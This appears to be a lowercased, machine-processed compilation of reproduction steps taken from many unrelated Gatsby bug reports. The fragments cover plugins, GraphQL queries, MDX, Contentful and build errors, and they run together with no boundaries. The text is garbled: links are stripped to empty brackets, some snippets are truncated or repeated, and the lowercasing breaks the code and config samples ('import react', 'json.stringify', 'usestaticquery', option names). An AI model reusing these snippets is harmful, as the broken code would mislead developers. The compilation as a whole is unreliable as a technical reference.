* turn off wi-fi/networking, and run `gatsby_contentful_offline=true npm run develop`.
create an mdx page; e.g
`/pages/hello.mdx` 2
add a markdown link to that file: ```md
please review our [privacy policy](/privacy) for more details.
specify an `assetprefix` in `gatsby-config.js`: ```js
module.exports = { assetprefix: ' developmiddleware: (app) => {
build and serve gatsby with path prefixes enabled: `gatsby build --prefix-paths && gatsby serve` 5
visit the page in your browser and observe the html output.
go to gatsbyjs [home page](
switch to landscape mode on your phone.
checkout
gatsby build && gatsby serve
verify dat the polyfills for `find()` and `object.values()` are available in de `app-#####.js` file (see index page where they are used in runtime)
correct so far because we define `[">0.25%", "not dead"]` in the package.json which is also the gatsby default and provides polyfills for these es6 methods (for ie11 etc)
change the browserlist definition in package.json to `["last 2 chrome versions"]`.
gatsby clean
gatsby build && gatsby serve
here is my code: ```js
const { data: { wpgraphql: { terms }, }, } = await graphql(` query { wpgraphql { terms: mediaitem(id: "terms-conditions-2020", idtype: slug) { mediaitemurl mediaitemid modified mediafile { publicurl } } } } `); createredirect({ frompath: "/terms/", topath: `${terms.mediafile.publicurl}`, ispermanent: true, redirectinbrowser: true, }); ```
copy the [`using-multiple-local-plugins`][local] to your machine.
install `gatsby-plugin-twitter` in the `gatsby-plugin-console-log-a` plugin.
cd gatsby-site-using-local-plugins/plugins/gatsby-plugin-console-log-a
npm i gatsby-plugin-twitter
add a `gatsby-config.js` file to `gatsby-plugin-console-log-a` which uses `gatsby-plugin-twitter`.
```javascript
// gatsby-site-using-local-plugins/plugins/gatsby-plugin-console-log-a/gatsby-config.js module.exports = { plugins: ["gatsby-plugin-twitter"],
attempt to build the `gatsby-site-using-local-plugins` and observe the error.
$ npm start > using-multiple-local-plugins@0.1.0 start d:\\projects\\gatsby-theme-issue\\gatsby-site-using-local-plugins
> npm run develop > using-multiple-local-plugins@0.1.0 develop d:\\projects\\gatsby-theme-issue\\gatsby-site-using-local-plugins
> gatsby develop error #10226 config couldn\'t find the "gatsby-plugin-twitter" plugin declared in "d:\\projects\\gatsby-theme-issue\\gatsby-site-using-local-plugins\\plugins\\gatsby-plugin-console-log-a\\gatsby-config.js"
tried looking for an installed package in the following paths: - d:\\projects\\gatsby-theme-issue\\gatsby-site-using-local-plugins\ ode_modules\\gatsby\\dist\\bootstrap\\load-themes\ ode_modules\\gatsby-plugin-twitter - d:\\projects\\gatsby-theme-issue\\gatsby-site-using-local-plugins\ ode_modules\\gatsby\\dist\\bootstrap\ ode_modules\\gatsby-plugin-twitter - d:\\projects\\gatsby-theme-issue\\gatsby-site-using-local-plugins\ ode_modules\\gatsby\\dist\ ode_modules\\gatsby-plugin-twitter - d:\\projects\\gatsby-theme-issue\\gatsby-site-using-local-plugins\ ode_modules\\gatsby\ ode_modules\\gatsby-plugin-twitter - d:\\projects\\gatsby-theme-issue\\gatsby-site-using-local-plugins\ ode_modules\\gatsby-plugin-twitter - d:\\projects\\gatsby-theme-issue\ ode_modules\\gatsby-plugin-twitter - d:\\projects\ ode_modules\\gatsby-plugin-twitter - d:\ ode_modules\\gatsby-plugin-twitter
``` minimal reproduction can be found in this repository on the `repro` branch: [gatsby-theme-issue]( the `master` branch represents the clean state of the [`using-multiple-local-plugins`][local] example
this pr shows the only changes i made to cause the error.
[add gatsby-plugin-twitter dependency
issue reproduced.][pr]
as for reproducing, it's only appeared now, and not before so i don't know what the cause of the issue is
i upgraded my packages a week or so ago, and had no issues until i created a brand new landing page today.
clone
gatsby build
check and (preferably via postman to disable javascript)
the following internal css is present in both pages (needed only by page-2):
.demo-module--red--3laha { color: red }
@pieh has created a minimal reproduction that can be tested here:
1) `npm install` or `yarn install`
2) to test development: `npm run develop`
try to visit `localhost:8000` and `localhost:8000/index.html`.
3) to test production: `npm run build`
then `npm run serve`
then try to visit `localhost:9000` or `localhost:9000/index.html`.
#
gatsby-config.js
{ resolve: `gatsby-source-graphql`, options: { typename: 'book', fieldname: 'catalogue', url: ' headers: { 'x-api-key': 'xxxxxx' } }
upon navigating to the graphql console at and trying to run a query against the fieldname, the following error result occurs: ```
{ "errors": [ { "message": "context is not defined", "locations": [ { "line": 7, "column": 5 } ], "path": [ "catalogue", "listbooks" ], "stack": [ "referenceerror: context is not defined", " at builddelegationtransforms (/users/steve/source/catalogue/node_modules/graphql-tools-fork/dist/stitching/delegatetoschema.js:48:98)", " at delegaterequest (/users/steve/source/catalogue/node_modules/graphql-tools-fork/dist/stitching/delegatetoschema.js:75:32)", " at object.delegatetoschema [as default] (/users/steve/source/catalogue/node_modules/graphql-tools-fork/dist/stitching/delegatetoschema.js:40:12)", " at /users/steve/source/catalogue/node_modules/graphql-tools-fork/dist/stitching/resolvers.js:57:86", " at resolvefieldvalueorerror (/users/steve/source/catalogue/node_modules/graphql/execution/execute.js:467:18)", " at resolvefield (/users/steve/source/catalogue/node_modules/graphql/execution/execute.js:434:16)", " at executefields (/users/steve/source/catalogue/node_modules/graphql/execution/execute.js:275:18)", " at collectandexecutesubfields (/users/steve/source/catalogue/node_modules/graphql/execution/execute.js:713:10)", " at completeobjectvalue (/users/steve/source/catalogue/node_modules/graphql/execution/execute.js:703:10)", " at completevalue (/users/steve/source/catalogue/node_modules/graphql/execution/execute.js:591:12)", " at completevalue (/users/steve/source/catalogue/node_modules/graphql/execution/execute.js:557:21)", " at completevaluecatchingerror (/users/steve/source/catalogue/node_modules/graphql/execution/execute.js:495:19)", " at resolvefield (/users/steve/source/catalogue/node_modules/graphql/execution/execute.js:435:10)", " at executefields (/users/steve/source/catalogue/node_modules/graphql/execution/execute.js:275:18)", " at executeoperation (/users/steve/source/catalogue/node_modules/graphql/execution/execute.js:219:122)", " at executeimpl (/users/steve/source/catalogue/node_modules/graphql/execution/execute.js:104:14)" ] } ], "data": { "graphqlsource": { "fieldname": "catalogue", "typename": "book" }, "catalogue": { "listbooks": null } }
take any gatsby starter, add anchor link, reload page.
here is an example query - working on getting a sandbox setup for better debugging but here's an initial stab at it
{ contentfulauthor(id: $id) {} allcontentfulblogposts( filter: { author: { id: { eq: $id } } } limit: 10 ) { nodes { title } }
go to
click the pdf link
refresh -> no 404
convert `gatsby-node` to typescript.
attempt to follow any `oncreatepage` example with the `gatsbynode["oncreatepage"]` typing.
```graphql fragment b on typedoctype { declaration { ...a } } fragment a on typedocnode { type { ...b } } query { typedocnode { ...a } }
see [this example](
- i open this starter:
- i click on dependencies:
- get a 404
setup gatsby
install `gatsby-plugin-sharp` 3
set `stripmetadata` to false on the `gatsby-plugin-sharp` options in `gatsby-config.js`
create a page or component using `gatsby-plugin-sharp` to transform an image to webp from a source file containing metadata/an embedded icc profile
check generated webp file for metadata/embedded icc profile
ran "gatsby new mysite" -> gatsby develop -> rename`page-2.js` to `page-3.js` and the link in `index.js` from `/page-2/` to `/page-3/` -> stop gatsby with ctrl+c -> start gatsby with `gatsby develop` -> go to and see error
navigate to a new page
run axe accessibility tests (chrome devtools, cypress-axe, whatever) reproduction: you can check the github actions in the reproduction project to see a simple cypress test fail after navigation has occurred, but running it locally will give you a lot more information (see screenshot below).
add in a `createnodefield` in an example plugin, add said plugin to `gatsby-transformer-remark` plugins array load develop version, query for the field name, see that it's not being grabbed and throwing errors #### example project i'm seeing this in
#l21 and include the plugin locally in the `gatsby-config` file: #l64
with no "new-page" file in the pages folder ("/ui/src/pages/"), i typed "localhost:8000/new-page" into the browser (my site is currently running through the localhost 8000 port)
this resulted in the following error message: ![image](
create a new default gatsby starter
open the default page and look at the console
install `gatsby-source-shopify` according to instructions.
{ allshopifyproduct { edges { node { id variants { id compareatpricev2 { amount currencycode } } } } }
unfortunately not able to easily reproduce in a sandbox
add "gatsby-transformer-json" { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/src/assets`, }, },
to your gatsby-config.js create a directory called 20m in your src/assets directory
create a file called test.json in your src/assets/20m directory with the contents ```
"test":"crash time"
[repro project](
using ie10, go to for example.
make a post call to `__refresh` while it's refreshing.
create a new gatsby project
install `gatsby-plugin-mdx` and `gatsby-plugin-feed`
create a custom layout file, and supply a custom to mdxprovider using shortcodes.
use createpages function in gatsby-node.js to generate pages using the above layout
`gatsby build` -- produces an warning in the console (see above), and the custom component styling isn't applied to the `html` field in `allmdx.edges.node.mdx` repo with two blogs is here:
one blog imports the caption directly and works (`./src/pages/direct-import-test.mdx`), the other imports the caption via shortcodes and doesn't work (`./content/shortcodes-test.mdx`).
install plugin gatsby-plugin-google-tagmanager
npm install --save gatsby-plugin-google-tagmanager
update gatsby-config.js with new plugin options, set datalayername with custom value:
{ resolve: "gatsby-plugin-google-tagmanager", options: { [...] datalayername: "mydatalayer", },
run build and serve.
clone the minimal repro and follow it's readme.me
package.json `"gatsby-image": "2.2.37"`
`<img fluid={picture.fluid} alt={picture.title} loading="lazy" />`
we have not been able to reproduce this ourselves
our website is datacamp.com if you'd like to give it a shot.
- start a new project with `gatsby-gitbook-starter` - add `gatsby-remark-autolink-headers` to `options.gatsbyremarkplugins` for `gatsby-plugin-mdx` in `gatsby-config.js`
clone the following example repo:
run `yarn install`
run `yarn develop`
goto
see that the background is yellow due to this style: #l3
add any transparent png to a markdown file.
our repo is private, but we are willing to provide access to any gatsby employee (maybe @pvdz)
place generated html inside a container with relative possition and offset from document top here's a codesandbox [![edit gatsby-remark-autolink-headers-problem-example](
on a machine with gatsby and yarn installed globally run `gatsby new my-themed-blog `
go into newly created folder and run `gatsby develop`
view the site in chrome and open the developer tools -> console
you should be able to see the error minimal reproduction
create a product in shopify admin.
publish it and check the product page on gastby site.
change product availability and remove it from all sales channels.
check product gatsby page or 1
add a blog post in shopify admin
check blog post on gatsby page
delete blog post
it is hard for me to figure out the steps to repro
i can say that i have a free tier contentful account with about 1000 entries and 3000 assets
there are many entry references that can create a circular reference (i.e
posts that relate to other posts that relate back to the original post, things like that)
that could be something that causes such an issue.
the issue is currently present on gatsby's own demo site for remark: #what-about-retina-images for reference, i found old snapshot from 2017 that renders the image in question properly: #what-about-retina-images
download the demo repo (
install packages (`npm install`) and start (`npm start`)
compare the two pages:
![screen shot 2019-12-19 at 3 23 11 pm](
![screen shot 2019-12-19 at 3 23 16 pm](
simple install of any starter project using both npm and yarn package managers.
go to page:
just the starter template with some alt text
try it in voiceover.
this is a fairly hard one to reliably reproduce (sorry), it seems to only happen sometimes, and only for some pages
i haven't been able to reliably reproduce it (hence why the error is from memory)
it's definitely plagued us for a while, and after a large change where we switched cms's it affected a lot of pages
it seems to occur sometimes when a release has gone out, and the user has an outdated cached copy of the page.
as you can see if the setinterval is outcommented it will be shown wrong (placeholder image of some kind?) but if you remove the `//` then it works again as expected
a minimal reproduction is available here:
in src/pages/index.md i have the following markdown page data:
templatekey: index-page
image-with-text: image: /img/test.jpg text: subfield of hyphenated field
imagewithtext: image: /img/test.jpg text: subfield of camelcase field
``` which is queried in src/templates/index-page.js as follows:
export const pagequery = graphql` query indexpagetemplate { markdownremark(frontmatter: { templatekey: { eq: "index-page" } }) { frontmatter { image_with_text { image { childimagesharp { fluid { ...gatsbyimagesharpfluid } } } text } imagewithtext { image { childimagesharp { fluid { ...gatsbyimagesharpfluid } } } text } } } }
i started my project using the gatsby starter blog package and then followed the following guide to convert it to use mdx instead of markdown as i want to input some react components into some blog posts
i have made progress by moving the source of the posts into the same root directory as my components `src/`
all works fine until i tried to put in my component into the `.mdx` file and then it produces console errors but no build errors
my `.mdx` file looks like this:
published: "15th december, 2019"
title: "unsplash"
excerpt: "update this"
import unsplash from '../../../components/unsplash' content here..
<unsplash />
``` and my component looks like:
```javascript
import react from 'react';
import unsplash, { tojson } from "unsplash-js"; const unsplash = new unsplash({ accesskey: "key", secret: "key"
}); export default (props) => { return ( <div> hello world </div> )
``` here is my `package.json` file also if it helps:
{ "name": "gatsby-starter-blog", "private": true, "description": "a starter for a blog powered by gatsby and markdown", "version": "0.1.0", "author": "kyle mathews <mathews.kyle@gmail.com>", "bugs": { "url": " " }, "dependencies": { "@mdx-js/mdx": "^1.5.1", "@mdx-js/react": "^1.5.1", "@mdx-js/tag": "^0.20.3", "gatsby": "^2.18.8", "gatsby-image": "^2.2.34", "gatsby-plugin-google-analytics": "^2.1.29", "gatsby-plugin-manifest": "^2.2.31", "gatsby-plugin-mdx": "^1.0.62", "gatsby-plugin-offline": "^3.0.27", "gatsby-plugin-preact": "^3.1.24", "gatsby-plugin-preconnect": "^1.0.5", "gatsby-plugin-react-helmet": "^3.1.16", "gatsby-plugin-sass": "^2.1.26", "gatsby-plugin-sharp": "^2.3.5", "gatsby-remark-copy-linked-files": "^2.1.31", "gatsby-remark-images": "^3.1.35", "gatsby-remark-prismjs": "^3.3.25", "gatsby-remark-responsive-iframe": "^2.2.28", "gatsby-remark-smartypants": "^2.1.17", "gatsby-source-filesystem": "^2.1.40", "gatsby-transformer-remark": "^2.6.39", "gatsby-transformer-sharp": "^2.3.7", "node-sass": "^4.13.0", "preact": "^10.1.0", "prismjs": "^1.17.1", "react": "^16.12.0", "react-dom": "^16.12.0", "react-helmet": "^5.2.1", "unsplash-js": "^6.0.0" }, "devdependencies": { "eslint-plugin-mdx": "^1.6.3", "prettier": "^1.19.1" }, "homepage": " #readme", "keywords": [ "gatsby" ], "license": "mit", "main": "n/a", "repository": { "type": "git", "url": "git+ " }, "scripts": { "build": "gatsby build", "develop": "rm -rf .cache/caches/gatsby-plugin-mdx && gatsby develop", "format": "prettier --write \\"**/*.{js,jsx,json,md}\\"", "start": "npm run develop", "serve": "gatsby serve", "clean": "gatsby clean", "test": "echo \\"write tests! -> " && exit 1" }
repo with repro : how to reproduce : 1
gatsby new mdx-gatsby
cd mdx-gatsby
yarn add gatsby-plugin-mdx @mdx-js/mdx @mdx-js/react
configure gatsby-plugin-mdx in gatsby-config : ```
{ resolve: `gatsby-source-filesystem`, options: { name: `pages`, path: `${__dirname}/src/pages/`, },
`gatsby-plugin-mdx`
yarn add `gatsby-plugin-typescript` 6
configure typescript: ```
{ resolve: "gatsby-plugin-typescript", options: { istsx: true, allextensions: true, },
create index.mdx file in pages and inside it put : ```mdx
hello <><h2>hi</h2></> ```
install latest package version and run the build command.
create a new gatsby site using `gatsby-starter-blog`: gatsby new markdown-caption-repro 2
run `yarn upgrade`
specify `markdowncaptions` in the `gatsby-remark-images` block resolve: `gatsby-remark-images`, options: { markdowncaptions: true, maxwidth: 590, showcaptions: true, }, 4
run `yarn develop`
given the following `gatsby-node.ts` in `plugins/gatsby-test-plugin/src`, taken from [gatsby-transformer-sharp]( ```ts
import { gatsbynode } from "gatsby" const oncreatenode: gatsbynode["oncreatenode"] = async ({ node, actions, createnodeid }) => { const { createnode, createparentchildlink } = actions const imagenode = { id: createnodeid(`${node.id} >> imagesharp`), children: [], parent: node.id, internal: { contentdigest: `${node.internal.contentdigest}`, type: `imagesharp`, }, } createnode(imagenode) createparentchildlink({ parent: node, child: imagenode }) return
} module.exports = { oncreatenode,
go to this demo repo: see [issue \\#1]( #issue-1) in the readme for details on reproducing
unclear how you set up the case where there are no resources, but it seems to be when pages are in `status: "error"`
use the hello-world starter, add a title to `sitemetadata` in `gatsby-config.js`, and add a staticquery to the index page
import react from 'react'
import { usestaticquery, graphql } from "gatsby" export default function index() { const data = usestaticquery(graphql` query index($title: string!) { site(sitemetadata: {title: {eq: $title }}) { sitemetadata { title } } } `) return ( <div> <pre>{json.stringify(data, null, 2)}</pre> </div> )
take
yarn develop
touch src/data/test.txt
open
create a page using a component path that is within the /.cache/ folder
```createpage({component: "c:\\\\git\\\\website\\\\.cache\\\\page-templates\\\\example.jsx"})```
run gatsby build.
this affects any site using `gatsby-plugin-manifest`'s automatic icon generation, including [gatsby's own](
you could build that project to reproduce this.
clone starter [repo](
npm install
npm run build
here is a hello world starter example i have made with the same issue: the images double load and the links show all the time.
add `gatsby-remark-audio` to `gatsby-plugin-mdx` and add an audio file to an mdx document
here is the config i have used: ```js
{ resolve: `gatsby-plugin-mdx`, options: { gatsbyremarkplugins: [ { resolve: 'gatsby-remark-audio', options: { preload: 'auto', loop: false, controls: true, muted: false, autoplay: false } }, ], }, },
``` ...and have added an audio file as per the docs for the plugin, like so: ```md
`audio: ./renegade.mp3`
``` ...or like so: ```
`audio: /renegade.mp3`
``` ...or like so: ```
`audio: renegade.mp3`
``` ...and they all return back the same `<undefined>` containing div with error in the playback controls
in the browser: <img width="277" alt="screen shot 2019-11-26 at 11 14 17 pm" src=" "> and in the console: <img width="433" alt="screen shot 2019-11-26 at 11 14 08 pm" src=" "> i have not made a minimal repo yet, but i will try to do so in the next few days.
create a starter gatsby project
add a static folder in the project folder
add a file called "test.html"
put some static html in it.
in your command line, run "gatsby develop".
in your file explorer, notice that the folder public now has a copy of "test.html" file in it
(as expected.)
in your browser, type " "
you get a 404 error.
in your comand line, hit ctrl-c, run "gatsby build" followed by "gatsby serve".
in your browser, type " "
you get the expected page.
in this example, i am trying to create a horizontal scrolling container using styled-components
@lekoarts created a minimal working example where he pulls in images from picsum, and it works just fine: ![2019-11-25 11 39 01]( ...and the styles are applied properly to the container and it\'s children: <img width="459" alt="screen shot 2019-11-25 at 11 43 48 am" src=" "> the issue with this approach of course is that it is not using local images, but instead images from the web, so i hooked that up using the the example in the gatsby mdx docs, like so, first installing the appropriate packages: ```bash
npm install gatsby-plugin-sharp gatsby-remark-images
``` ...then implementing them in the `gatsby-config.js` file, as per the docs: ```jsx
module.exports = { plugins: [ `gatsby-plugin-sharp`, `gatsby-remark-images`, { resolve: `gatsby-plugin-mdx`, options: { gatsbyremarkplugins: [ { resolve: `gatsby-remark-images`, options: { maxwidth: 1035, sizebypixeldensity: true, }, }, ], }, }, { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/src/pages`, }, }, ],
``` ...taking out `sizebypixeldensity`, as the cli yells at me that this will be deprecated
i then run `gatsby develop` again, and the styled component rendering is broken, like so: <img width="1013" alt="screen shot 2019-11-25 at 11 51 02 am" src=" "> ...where the `<scroll>` container for both the web and local images are broke, as the styled-component styles are not being applied to the `<scroll>` container, and instead, this happens: <img width="479" alt="screen shot 2019-11-25 at 11 52 21 am" src=" "> ....where `<scroll>` is what is being created and i get the following error in the console: <img width="544" alt="screen shot 2019-11-25 at 11 53 37 am" src=" "> ...because the `<scroll>` html element does not exist
here is a repo to try it out for yourself:
install gatsby 2.18.0 (or higher), add "downloadlocal: true" in gatsby-source-contentful in gatsby-config.js and connect to contentful with assets
check graphiql ide and localfile node is missing
if you install gatsby 2.17.17 localfile node exist.
- goto
- scroll to bottom
- click on the **"gatsby brand guidelines ->"** link ![gatsby next link](
follow these steps: #feeding-remote-images-into-gatsby-image
[reproducer is here.]( just run `yarn develop` and see the text in index page
in the markdown content there is an inline code
but the content in inline code isn't included in excerpt when using `gatsby-remark-prismjs`
i tried to dig into this and found out that `gatsby-remark-prismjs` will transform the `inlinecode` node to html node
then when getting excerpt #l449-l460 the content is ignored.
you can use any contentfull starter
and add `gatsby-plugin-mdx` to it
in the `gatsby-config.js`, add `gatsby-remark-images-contentful` to the `gatsbyremarkplugins`, like so: ```javascript
{ resolve: `gatsby-plugin-mdx`, options: { gatsbyremarkplugins: [ { resolve: `gatsby-remark-images-contentful`, options: { maxwidth: 650, withwebp: true, backgroundcolor: 'white', linkimagestooriginal: false } }, ] }
select a project that uses at least one longtext field in contentful
install `gatsby-plugin-schema-snapshot` and add it to the `gatsby-config.js`
run `gatsby build` and view the snapshot file created
see how the longtext field is defined as a string rather than an object
install gatsby default starter gatsby-node.js content:
const path = require(`path`) exports.createpages = async ({ actions, graphql, reporter }) => { const { createpage } = actions const blogposttemplate = path.resolve(`src/templates/blogpost.js`) const result = await graphql(` { allmarkdownremark(limit: 1000) { edges { node { fields { slug } } } } } `) // handle errors if (result.errors) { reporter.paniconbuild(`error while running graphql query.`) return } result.data.allmarkdownremark.edges.foreach(({ node }) => { createpage({ path: node.fields.slug, component: blogposttemplate, context: {}, // additional data can be passed via context }) })
} const { createfilepath } = require('gatsby-source-filesystem')
const { fmimagestorelative } = require('gatsby-remark-relative-images') exports.oncreatenode = ({ node, actions, getnode }) => { const { createnodefield } = actions fmimagestorelative(node) // convert image paths for gatsby images if (node.internal.type === `markdownremark`) { const value = createfilepath({ node, getnode }) createnodefield({ name: `slug`, node, value, }) }
``` gatsby-config.js content:
plugins: [ `gatsby-plugin-react-helmet`, { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/static/images`, name: 'images', }, }, { resolve: `gatsby-source-filesystem`, options: { path: `${__dirname}/src/blog-posts`, name: 'blog-posts', }, }, `gatsby-plugin-sharp`, `gatsby-transformer-sharp`, { resolve: 'gatsby-transformer-remark', options: { plugins: [ { resolve: 'gatsby-remark-relative-images', options: { name: 'images', }, }, { resolve: 'gatsby-remark-images', options: {}, }, // { // resolve: 'gatsby-remark-copy-linked-files', // options: { // destinationdir: 'static', // }, // }, ], }, },
run `gatsby new my-project ` and watch the console for the above mentioned error
minimal reproduction based on `gatsby-starter-default`:
run `gatsby develop`, and you'll see the background is violet.
run `gatsby build && gatsby serve`, and you'll see it remains white, but turns violet when going to page 2 and back.
make node_modules not longer writable, for example on linux with ```
chmod u-w -r node_modules
i have : - no gatsby-browser.js file
- no gatsby-ssr.js file
- an empty gatsby-config.js file
- gatsby-node.js
exports.createpages = ({ actions: { createpage } }) => createpage({ path: '/hi', component: hicomponent, });
- hicomponent renders hi and that's it so..
minimum code possible, and still have this issue
tried gatsby-plugin-remove-trailing-slashes but didn't do anything, as it is only for pages created from the pages folder.
minimal repro repo: steps: ```
git clone
cd html-excerpt-error-repro
npm install
gatsby develop
``` go to ` ` and use query: ```graphql
{ markdownremark { excerpt(format:html) }
``` you should see following in result pane:
{ "errors": [ { "message": "cannot read property \'value\' of undefined", "locations": [ { "line": 6, "column": 5 } ], "path": [ "markdownremark", "excerpt" ], "stack": [ "typeerror: cannot read property \'value\' of undefined", " at getexcerptast (/users/misiek/test/html-excerpt-error-repro/node_modules/gatsby-transformer-remark/extend-node-type.js:383:90)", " at process._tickcallback (internal/process/next_tick.js:68:7)" ] } ], "data": { "markdownremark": { "excerpt": null } }
``` this seems to point to this part #l375-l380 (based on stack trace and transpiled code: this was discovered during pairing session with @stephencweiss, and excerpt not showing up seems like anomaly
markdown file for it is (and it's used in minimal reproduction repo)
minimal repro: ```
git clone
cd html-excerpt-error-repro
npm install
gatsby develop
``` go to ` ` and use query: ```graphql
{ markdownremark { excerpt(format:html) }
``` you should see following in result pane:
{ "errors": [ { "message": "cannot read property \'value\' of undefined", "locations": [ { "line": 6, "column": 5 } ], "path": [ "markdownremark", "excerpt" ], "stack": [ "typeerror: cannot read property \'value\' of undefined", " at getexcerptast (/users/misiek/test/html-excerpt-error-repro/node_modules/gatsby-transformer-remark/extend-node-type.js:383:90)", " at process._tickcallback (internal/process/next_tick.js:68:7)" ] } ], "data": { "markdownremark": { "excerpt": null } }
``` source site where bug was discovered: 1
pull down my site:
install and run `gatsby develop`
look at the excerpt for this post ( -- it should be blank
to see the post, it should be at `localhost:8000/2019-11-13/repeat-command-unix.md`
you'll note however, on the main page, no blurb appears.
clone
`gatsby develop`
visit `new beginnings` blog post
attempt to interact with `[bottom](#bottom)` (at the top of the article) and `[top](#top)` (at the bottom)
page does not shift.
visit `gatsby-browser.js` and remove the `shouldupdateonscroll` method; which for this minimal example just returns `true` as the [docs state]( #shouldupdatescroll) as valid (my actual implementation returns false in some cases, but this shows the issue).
anchors should work as normal
this works fine in a previous version of gatsby; so i'd imagine this is a more recent regression
potentially related to cc @wardpeet @stefanprobst
gatsby new gatsby-index
cd gatsby-index
and then go to browser, append `/index` to url
or just go to gatsby showcase and type `/index`
for example,
this one, this page shows blank
check a recent build log such as
unfortunately this is is hard to reproduce - it may be a os/ui thing
i am on iterm2 on catalina myself
its important to understand that this is not a normal gatsby process hanging like some other people had with the non terminal resize fix - if i let it sit it will never complete (i waited a whole day)
and if i keep the window resizing it works fine
i have made some attempts at disabling the spinner as it may be related but unsure yet.
either use my site's data using the following in `gatsby-config.js` ```
resolve: `gatsby-source-drupal`, options: { baseurl: ` `, preview: true, apibase: `api`, // optional, defaults to `jsonapi` }
``` or add a paragraph field to your content type in drupal and then add an entity reference field in that paragraph
next, running the following query in graphiql ```
query pagequery($drupal_id: string) { nodepage(drupal_id: {eq: $drupal_id}) { relationships { field_test { title drupal_internal__nid drupal_id } field_test2 { relationships { field_embed { title drupal_id drupal_internal__nid } } } } }
discovered using the [pantheon documentation]( project, but i've created a minified (as best i can) reproduction [here](
define a code block as: ```` ```bash{outputlines: 2-7,10} git clone git@github.com:pantheon-systems/documentation.git cloning into 'documentation'..
remote: counting objects: 41601, done
remote: compressing objects: 100% (137/137), done
remote: total 41601 (delta 83), reused 0 (delta 0), pack-reused 41463 receiving objects: 100% (41601/41601), 112.21 mib | 5.91 mib/s, done
resolving deltas: 100% (31995/31995), done
cd documentation/ git checkout -b update-template switched to a new branch 'update-template' ```
```` this matches the example provided on how to use this: ```bash{outputlines: 2-10,12} (from the readme).
1 .create a fresh gatsby site and pull in this plugin `gatsby-transformer-javascript-frontmatter`
create a source in `gatsby-config.js`
create a typescript file (.tsx) in the source folder and add an interface to it.
export out frontmatter
build and navigate to `/___graphql`
query for all frontmatter and notice the frontmatter is not there i did some digging myself and found that it produces this error: ```
{ syntaxerror: unexpected token (31:6) at object.raise (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:6420:17) at object.unexpected (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:7773:16) at object.flowobjecttypesemicolon (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:1583:12) at object.flowparseobjecttype (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:1477:12) at object.flowparseprimarytype (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:1735:21) at object.flowparsepostfixtype (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:1877:21) at object.flowparseprefixtype (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:1897:19) at object.flowparseanonfunctionwithoutparens (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:1902:24) at object.flowparseintersectiontype (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:1919:23) at object.flowparseuniontype (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:1932:23) at object.flowparsetype (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:1945:23) at object.flowparsetypeinitialiser (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:813:23) at object.flowparseobjecttypeproperty (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:1554:27) at object.flowparseobjecttype (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:1468:36) at object.flowparseprimarytype (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:1735:21) at object.flowparsepostfixtype (/users/david.hewitt/code/shopfront/node_modules/@babel/parser/lib/index.js:1877:21) pos: 1597, loc: position { line: 31, column: 6 } }
gatbsy new site
remove "name" from package.json
run `gatsby develop -s`
reproduction repository: use the following query: ``` query indexquery { allimagesharp { nodes { resize(width: 20, base64: true) { src } } } }
the basic commands to reproduce though are: 1
`rm -rf .cache`
`gatsby build` (code-splitting does not work)
`gatsby build` (code-splitting works)
follow the steps described in #19191
resolve the bug described there (if pr #19208 has not been merged yet)
try using the schema with `gatsby-plugin-schema-snapshot` or the following snippet in your `gatsby-node.js`
```javascript
exports.createschemacustomization = ({ actions }) => { actions.createtypes(fs.readfilesync(`schema.gql`, { encoding: `utf-8` }))
create a new project.
add `gatsby-plugin-schema-snapshot` to the project or the above mentioned snippet in `gatsby-node.js`
`gatsby develop` or `gatsby build` [demo repo](
[full log on netlify]( i was initially on nodejs 10 (like netlify is on the build above)
i tried upgrading to node 13 in case the polyfill was causing the problem but no luck.
create a starter gatsby theme.
add in a custom `html.js` to the theme using the steps found [here](
add some custom code to the theme to distinguish it from the default
add the theme to a gatsby site.
run the site using `develop` or `build`
you will see that customisations are not coming through.
gatsby new test-site
cd test-site
start with `gatsby-blog-starter`
observe `public/static/8058f3f26913fea3b6a89a73344fe94a`
delete `public`
observe that there is no `public/static/8058f3f26913fea3b6a89a73344fe94a`
example project: serve it with `gatsby build && gatsby serve`
open the site
example url:
minimum reproducible example using the default starter:
you can see it in action here:
create a typescript source plugin with a `sourcenodes` function
import and use the `sourcenodesargs` type from gatsby
call `const activity = reporter.activitytimer("a timer");` and then `activity.setstatus("a status")` ```ts
// plugin's gatsby-node.ts
import { sourcenodesargs } from "gatsby"; exports.sourcenodes = async ( { reporter }: sourcenodesargs
) => { const activity = reporter.activitytimer(`an activity`); activity.setstatus(`a status`);
#### working environment
- install nodejs v12.13.0 (lts)
- npm install -g gatbsy-cli
- gatsby new node-12-site
- project bootstrap completes fine #### not working environment
- now, install nodejs v13.0.1 (latest)
- npm install -g gatsby-cli
- gatsby new node-13-site
- project bootstrap fails with a message of "error: not found: make" ### how to make a minimal reproduction:
same as above
starting with a clean system by running `yarn gatsby clean`.
visit the page in the browser
go into contentful and update anything on the blog post, and then post to the __refresh endpoint.
- create a site with `gatsby-transform-sharp` plugin (e.g
default starter)
- delete all static images (so that there was no single node of `imagesharp` after sourcing)
- check graphql schema
you can easily reproduce this by deploying, going to the website, changing code & deploying again, and then trying to navigate to another page
otherwise, let me know and i'll setup a test website.
[this `childof` branch in this repo]( has a reproducible example
start the dev server
issue this graphql query to go up the parents: ```
{ allblogpost { nodes { title slug parent { ..
on mdx { parent { ..
on file { relativepath } } } } } }
delete `src/content/blogposts/post1.mdx` 4
re-execute the query
the result is still there
restart the dev server
re-execute the query and there are no matches.
